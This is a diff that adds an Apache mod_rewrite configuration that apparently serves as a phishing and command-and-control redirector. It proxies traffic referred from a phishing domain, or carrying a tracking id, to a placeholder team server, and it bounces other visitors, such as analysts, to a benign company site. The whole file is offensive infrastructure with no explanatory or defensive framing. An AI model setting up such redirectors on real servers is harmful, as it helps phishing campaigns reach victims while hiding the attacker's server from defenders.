@@ -1,0 +1,9 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^http://phishdomain.com [NC]
+RewriteRule ^(.*)$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
+RewriteCond %{QUERY_STRING} ^id=(.*)
+RewriteRule ^(.*)$ /$1?id=${remap:%1} [R=302]
+RewriteCond %{QUERY_STRING} ^id=nftoken [OR]
+RewriteCond %{QUERY_STRING} !^id=*
+RewriteRule ^(.*)$ http://COMPANY-DOMAIN/? [L,R=302]
+RewriteRule ^(.*)$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
